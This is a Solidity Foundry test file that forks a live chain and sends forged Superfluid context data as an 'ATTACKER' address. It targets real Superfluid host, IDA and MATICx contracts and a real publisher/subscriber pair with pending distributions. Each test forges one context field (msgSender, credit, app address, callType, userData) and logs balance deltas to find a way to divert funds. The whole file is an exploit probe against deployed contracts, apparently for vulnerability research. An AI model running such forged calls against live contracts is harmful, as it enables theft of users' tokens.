// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory);
}

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool, bool, uint128, uint256);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}

/// @notice Systematically test what happens when we forge EACH ctx field
/// on a real claim with pending distribution
contract CtxFieldScan is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    // Known tuple with pending distribution
    address constant PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    uint32 constant IDX = 1;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    /// @notice Baseline: normal claim (no forgery)
    function test_00_baseline() public {
        _snapshotAndClaim("BASELINE", _normalClaimData());
    }

    /// @notice Forge msgSender = subscriber (what if IDA uses msgSender as recipient?)
    function test_01_forged_msgSender_is_attacker() public {
        _snapshotAndClaim("msgSender=ATTACKER", _forgedClaimData(
            ATTACKER,   // msgSender = us
            0,          // normal callType/appLevel
            0,          // normal timestamp
            bytes4(0),  // normal selector
            "",         // normal userData
            0, 0, address(0), address(0)  // normal app fields
        ));
    }

    /// @notice Forge msgSender = subscriber address itself
    function test_02_forged_msgSender_is_sub() public {
        _snapshotAndClaim("msgSender=SUB", _forgedClaimData(
            SUB,        // msgSender = subscriber
            0, 0, bytes4(0), "",
            0, 0, address(0), address(0)
        ));
    }

    /// @notice Forge msgSender = publisher
    function test_03_forged_msgSender_is_pub() public {
        _snapshotAndClaim("msgSender=PUB", _forgedClaimData(
            PUB,        // msgSender = publisher
            0, 0, bytes4(0), "",
            0, 0, address(0), address(0)
        ));
    }

    /// @notice Forge appCreditGranted = MAX
    function test_04_forged_credit_max() public {
        _snapshotAndClaim("credit=MAX", _forgedClaimData(
            ATTACKER, 0, 0, bytes4(0), "",
            type(uint128).max,  // appCreditGranted = MAX
            0, address(0), address(0)
        ));
    }

    /// @notice Forge appAddress = attacker
    function test_05_forged_appAddress_attacker() public {
        _snapshotAndClaim("appAddr=ATTACKER", _forgedClaimData(
            ATTACKER, 0, 0, bytes4(0), "",
            0, 0, ATTACKER, address(0)
        ));
    }

    /// @notice Forge appCreditToken = MATICx
    function test_06_forged_creditToken_maticx() public {
        _snapshotAndClaim("creditToken=MATICx", _forgedClaimData(
            ATTACKER, 0, 0, bytes4(0), "",
            0, 0, address(0), MATICx
        ));
    }

    /// @notice Forge callType = APP_CALLBACK (3)
    function test_07_forged_callType_callback() public {
        uint256 callInfo = (1 << 8) | 3; // appLevel=1, callType=APP_CALLBACK
        _snapshotAndClaim("callType=CALLBACK", _forgedClaimDataRaw(callInfo, ATTACKER, bytes4(0), ""));
    }

    /// @notice Forge userData with attacker address encoded
    function test_08_forged_userData() public {
        _snapshotAndClaim("userData=ATTACKER", _forgedClaimData(
            ATTACKER, 0, 0, bytes4(0),
            abi.encode(ATTACKER),  // userData contains our address
            0, 0, address(0), address(0)
        ));
    }

    // ============ Helpers ============

    function _snapshotAndClaim(string memory label, bytes memory outerCalldata) internal {
        uint256 atkBefore = ATTACKER.balance;
        uint256 atkMxBefore = IMATICx(MATICx).balanceOf(ATTACKER);
        (int256 atkRtBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        uint256 subMxBefore = IMATICx(MATICx).balanceOf(SUB);
        uint256 pubMxBefore = IMATICx(MATICx).balanceOf(PUB);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, outerCalldata, "") {
            uint256 atkAfter = ATTACKER.balance;
            uint256 atkMxAfter = IMATICx(MATICx).balanceOf(ATTACKER);
            (int256 atkRtAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
            uint256 subMxAfter = IMATICx(MATICx).balanceOf(SUB);
            uint256 pubMxAfter = IMATICx(MATICx).balanceOf(PUB);

            console.log(string.concat("--- ", label, " ---"));
            console.log("ATK native delta:", int256(atkAfter) - int256(atkBefore));
            console.log("ATK MATICx delta:", int256(atkMxAfter) - int256(atkMxBefore));
            console.log("ATK realtime delta:", atkRtAfter - atkRtBefore);
            console.log("SUB MATICx delta:", int256(subMxAfter) - int256(subMxBefore));
            console.log("PUB MATICx delta:", int256(pubMxAfter) - int256(pubMxBefore));
        } catch {
            console.log(string.concat("--- ", label, " --- REVERTED"));
        }
    }

    function _normalClaimData() internal pure returns (bytes memory) {
        return abi.encodeWithSelector(IIDA.claim.selector, MATICx, PUB, IDX, SUB, new bytes(0));
    }

    function _forgedClaimData(
        address msgSender, uint256 extraCallInfo, uint256 ts, bytes4 selector, bytes memory userData,
        uint256 creditGranted, int256 creditUsed, address appAddr, address creditToken
    ) internal view returns (bytes memory) {
        uint256 callInfo = (extraCallInfo == 0) ? (1 << 32) : extraCallInfo; // default: callType=AGREEMENT
        if (ts == 0) ts = block.timestamp;
        if (selector == bytes4(0)) selector = IIDA.claim.selector;

        bytes memory fakeCtx = abi.encode(
            abi.encode(callInfo, ts, msgSender, selector, userData),
            abi.encode(
                uint256(uint128(creditGranted)) | (uint256(0) << 128), // allowanceIO
                creditUsed,
                appAddr,
                creditToken
            )
        );

        bytes memory inner = abi.encodeWithSelector(IIDA.claim.selector, MATICx, PUB, IDX, SUB, fakeCtx);
        return abi.encodePacked(inner, abi.encode(new bytes(0)));
    }

    function _forgedClaimDataRaw(uint256 callInfo, address msgSender, bytes4 selector, bytes memory userData) internal view returns (bytes memory) {
        bytes memory fakeCtx = abi.encode(
            abi.encode(callInfo, block.timestamp, msgSender, selector, userData),
            abi.encode(uint256(0), int256(0), address(0), address(0))
        );
        bytes memory inner = abi.encodeWithSelector(IIDA.claim.selector, MATICx, PUB, IDX, SUB, fakeCtx);
        return abi.encodePacked(inner, abi.encode(new bytes(0)));
    }
}
